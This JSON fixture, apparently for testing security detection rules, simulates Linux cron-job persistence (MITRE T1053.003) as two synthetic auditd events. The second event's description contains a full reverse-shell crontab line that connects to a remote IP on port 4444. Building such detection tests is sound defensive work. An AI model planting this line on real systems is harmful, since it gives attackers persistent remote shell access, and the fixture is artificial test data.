{
  "technique_id": "T1053.003",
  "technique_name": "Cron Job Persistence (Linux)",
  "description": "Simulates attacker-controlled crontab modification to establish persistence on a Linux host via a reverse shell entry.",
  "platform": "linux",
  "mitre_tactic": "persistence",
  "events": {
    "attack_sequence": [
      {
        "@timestamp": "{{now}}",
        "event": {
          "category": "process",
          "type": "start",
          "kind": "event",
          "module": "auditd",
          "dataset": "auditd.log"
        },
        "agent": { "type": "auditbeat" },
        "host": {
          "name": "LNX-WEB-01",
          "os": { "family": "linux", "platform": "ubuntu" }
        },
        "process": {
          "name": "crontab",
          "executable": "/usr/bin/crontab",
          "args": ["-e"],
          "command_line": "crontab -e",
          "pid": 31337,
          "parent": { "name": "bash", "pid": 30001 }
        },
        "user": { "name": "root", "id": "0" },
        "auditd": {
          "log": { "record_type": "SYSCALL" },
          "data": { "syscall": "execve" }
        },
        "_simulation": {
          "type": "attack",
          "technique": "T1053.003",
          "platform": "linux",
          "expected_match": true,
          "sequence_order": 1,
          "sequence_total": 2,
          "description": "root edits crontab directly — precursor to cron persistence entry"
        }
      },
      {
        "@timestamp": "{{now}}",
        "event": {
          "category": "file",
          "type": "change",
          "kind": "event",
          "module": "auditd",
          "dataset": "auditd.log",
          "action": "opened-file"
        },
        "agent": { "type": "auditbeat" },
        "host": {
          "name": "LNX-WEB-01",
          "os": { "family": "linux", "platform": "ubuntu" }
        },
        "file": {
          "path": "/var/spool/cron/crontabs/root",
          "name": "root",
          "directory": "/var/spool/cron/crontabs"
        },
        "process": {
          "name": "crontab",
          "executable": "/usr/bin/crontab",
          "pid": 31337
        },
        "user": { "name": "root", "id": "0" },
        "auditd": {
          "log": { "record_type": "PATH" },
          "data": { "syscall": "open" }
        },
        "_simulation": {
          "type": "attack",
          "technique": "T1053.003",
          "platform": "linux",
          "expected_match": true,
          "sequence_order": 2,
          "sequence_total": 2,
          "description": "Crontab file for root written — reverse shell added: * * * * * /bin/bash -i >& /dev/tcp/203.0.113.50/4444 0>&1"
